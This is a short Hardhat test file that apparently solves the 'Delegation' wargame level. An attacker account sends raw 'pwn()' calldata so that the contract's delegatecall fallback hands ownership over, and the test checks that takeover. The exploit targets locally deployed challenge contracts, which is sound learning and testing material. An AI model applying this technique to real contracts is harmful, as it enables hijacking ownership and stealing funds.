const { expect } = require("chai");
const { ethers } = require("hardhat");
const { SignerWithAddress } = require("@nomiclabs/hardhat-ethers/signers");

async function sendCustomFunction(sender, contract, methodSig, methodName) {
    const ABI = [methodSig];
    const iface = new ethers.utils.Interface(ABI);

    const tx = await sender.sendTransaction({
        from: sender.address,
        to: contract.address,
        data: iface.encodeFunctionData(methodName),
    });
    const receipt = await tx.wait();
    return receipt;
}

describe("Delegation", async () => {

    it("should transfer ownership", async function () {
        const DelegateToken = await ethers.getContractFactory("Delegate");
        const DelegationToken = await ethers.getContractFactory("Delegation");
        const [owner, attacker] = await ethers.getSigners();
        const delegate = await DelegateToken.connect(owner).deploy(owner.address);
        const delegation = await DelegationToken.connect(owner).deploy(delegate.address);

        await sendCustomFunction(attacker, delegation, "function pwn()", "pwn");

        const delegatedOwner = await delegation.owner();
        expect(delegatedOwner).to.equals(attacker.address);
    });

});